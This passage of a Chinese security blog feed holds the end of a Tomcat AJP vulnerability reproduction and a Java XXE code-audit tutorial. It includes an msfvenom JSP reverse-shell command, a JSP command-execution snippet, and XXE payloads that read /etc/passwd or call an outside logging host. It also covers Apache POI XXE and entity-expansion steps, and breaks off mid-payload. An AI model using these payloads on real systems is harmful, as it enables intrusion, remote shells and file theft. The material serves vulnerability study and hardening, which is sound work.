java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200221200551291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195146769.png" alt="在这里插入图片描述"><br><strong>利用msf反弹shell</strong>（也是需要配合上传漏洞）<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt</code><br><img src="https://img-blog.csdnimg.cn/20200221202102945.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195022259.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h1><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p>一、若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作：</p><p>（1）编辑 <CATALINA_BASE>/conf/server.xml，找到如下行（<CATALINA_BASE> 为 Tomcat 的工作目录）：</CATALINA_BASE></CATALINA_BASE></p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code><br>（2）将此行注释掉（也可删掉该行）：</p><p><code>&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</code></p><p>（3）保存后需重新启动Tomcat，规则方可生效。</p><p>二、若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</code></p><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt;</code></p><hr><h1 id="文件资料下载"><a href="#文件资料下载" class="headerlink" title="文件资料下载"></a>文件资料下载</h1><p>文中所以资料都在这里。<br>链接: <a href="https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA" target="_blank" rel="noopener">https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA</a> 提取码: xg4s</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.t00ls.net/thread-55061-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55061-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1</a><br><a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC" target="_blank" rel="noopener">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</a>**</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统
      
    
    </summary>
    
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章读懂Java代码审计之XXE</title>
    <link href="http://yoursite.com/2020/02/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%BB%E6%87%82Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BXXE/"/>
    <id>http://yoursite.com/2020/02/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%BB%E6%87%82Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BXXE/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-02-23T07:33:37.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>学习总结Java审计过程中笔记，审计方法</li><li>阅读要求：有简单Java代码基础，了解漏洞原理</li><li>阅读时长：30min 篇幅比较长</li></ul><hr><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; 简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><hr><h1 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h1><p>&emsp;&emsp; 不说废话，先看效果，成功读取文本内容。tip: 本次测试中需要将<code>Content-Type: application/x-www-form-urlencoded</code>修改成<code>Content-Type: application/xml</code>不然就无法成功。<br><img src="https://img-blog.csdnimg.cn/20200221154143875.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221153921615.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <strong>代码分析漏洞成因：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxeDocumentBuilderReturn</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(node.getNodeName() + <span class="string">": "</span> + node.getTextContent() + <span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(buf.toString());</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; <strong>不难发现我们只要清楚这四行代码功能，就能很好清楚Java解析XML机制。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance方法 ，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。<br><img src="https://img-blog.csdnimg.cn/20200222151828506.png#pic_center" alt="在这里插入图片描述"></p><hr><h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><p><img src="https://img-blog.csdnimg.cn/20200221160018601.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                        result.append(node.getNodeName() + <span class="string">": "</span> + node.getFirstChild().getNodeValue() + <span class="string">"\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(result.toString());</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 我们使用burp比较器分析两部分代码，不能发现左边就是多了一个判断语句。（左:无回显代码 右:有回显代码）<br><img src="https://img-blog.csdnimg.cn/20200221160503214.png#pic_center" alt="在这里插入图片描述"><br><em><code>if (child.item(j).getNodeType() == Node.ELEMENT_NODE)</code></em><br> 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。</p><hr><p>对于这样子无回显的验证可以使用ceye.io网站，具体方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip.port.xxxx.ceye.io/xxe_test"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200222193843204.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222193929997.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 复测过程中遇见的小坑，个人感觉纯属玄学问题。两次请求数据几乎是一模一样的，但是返回结果愣是不一样，一个200一个400。（充分体现了挖洞得随缘，有时候姿势对了，但是结果不对可能不是你的错误）<br><img src="https://img-blog.csdnimg.cn/20200222194626447.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222194755884.png" alt="在这里插入图片描述"></p><hr><h1 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h1><p><strong>什么是xinclude</strong><br>&emsp;&emsp; 顾名思义，xinclude可以理解为xml include熟悉编译/脚本语言的一定熟知，像php的include，python和java的import都是可以进行文件包含的。<br><strong>那么文件包含有什么好处？</strong><br>&emsp;&emsp; 当然是可以使代码更整洁，我们可以将定义的功能函数放在function.php中，再在需要使用功能函数的文件中使用include包含function.php，这样就避免了重复冗余的函数定义，同样可以增加代码的可读性。故此，xinclude也不例外，它是xml标记语言中包含其他文件的方式。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///E:/1.txt"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200222211644240.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxe_xinclude_DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">           System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">           DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">           dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">           dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">           DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">           StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">           InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">           Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">           NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">           String str = <span class="keyword">new</span> String();</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">               Node rootNode = rootNodeList.item(i);</span><br><span class="line">               NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">               <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                   Node xxeNode = xxe.item(j);</span><br><span class="line">             </span><br><span class="line">                   str = str + xxeNode.getNodeValue();</span><br><span class="line">                   System.out.println(str);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           sr.close();</span><br><span class="line">           <span class="keyword">return</span> str;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           System.out.println(e);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Payload分享"><a href="#Payload分享" class="headerlink" title="Payload分享"></a>Payload分享</h2><p>飘零师傅的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">resetPassword</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/fontconfig/fonts.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:////&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ELEMENT aa (bb'</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">status</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM '</span>file:///nonexistent/%file;<span class="meta-string">'&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="Poi-ooxml-XXE"><a href="#Poi-ooxml-XXE" class="headerlink" title="Poi ooxml XXE"></a>Poi ooxml XXE</h1><h2 id="CVE-2014-3529"><a href="#CVE-2014-3529" class="headerlink" title="CVE-2014-3529"></a>CVE-2014-3529</h2><ul><li><p>新建xxe.xlsx文件，修改后缀名xxe.zip解压。<br><img src="https://img-blog.csdnimg.cn/2020022311395424.png" alt="在这里插入图片描述"></p></li><li><p>修改[Content-Types].xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxxx.xx.ixxo"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>后因为无法访问ceye.io网站，笔者自己在本地搭建一台服务器。推荐使用phpstudy，开启访问日志，具体方法百度。</code><br><img src="https://img-blog.csdnimg.cn/20200223113339623.png" alt="在这里插入图片描述"></p></li><li><p>重新压缩成zip，在修改成xlsx文件。</p></li><li><p>上传文件<br><img src="https://img-blog.csdnimg.cn/20200223140541747.png" alt="在这里插入图片描述"></p></li><li><p>或者直接读取文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">File f = <span class="keyword">new</span> File(<span class="string">"/path/xxe.xlsx"</span>);</span><br><span class="line">        FileInputStream in = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line"></span><br><span class="line">        XSSFWorkbook wb = <span class="keyword">new</span> XSSFWorkbook(in); <span class="comment">// xxe vuln</span></span><br><span class="line">        XSSFSheet sheet = wb.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> total = sheet.getLastRowNum();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Row row : sheet)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Cell cell :row)&#123;</span><br><span class="line">               System.out.println(cell.getStringCellValue());</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"expection"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>看下报错，报出poi错误才是正确的。<br><img src="https://img-blog.csdnimg.cn/20200223140830833.png" alt="在这里插入图片描述"></p></li><li><p>查看访问记录<br><img src="https://img-blog.csdnimg.cn/20200223141207658.png" alt="在这里插入图片描述"></p></li><li><p>修复建议，换成3.10-FINAL版本以上<br><img src="https://img-blog.csdnimg.cn/20200223141417847.png" alt="在这里插入图片描述"></p></li></ul><hr><h2 id="CVE-2017-5644"><a href="#CVE-2017-5644" class="headerlink" title="CVE-2017-5644"></a>CVE-2017-5644</h2><p>其他步骤同CVE-2014-3529中的方式，这次是在 xl/workbook.xml 中注入实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [     </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span> <span class="meta-string">""</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e2</span> <span class="meta-string">"&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e3</span> <span class="meta-string">"&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e4</span> <span class="meta-string">"&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e5</span> <span class="meta-string">"&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e6</span> <span class="meta-string">"&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e7</span> <span class="meta-string">"&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e8</span> <span class="meta-string">"&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span 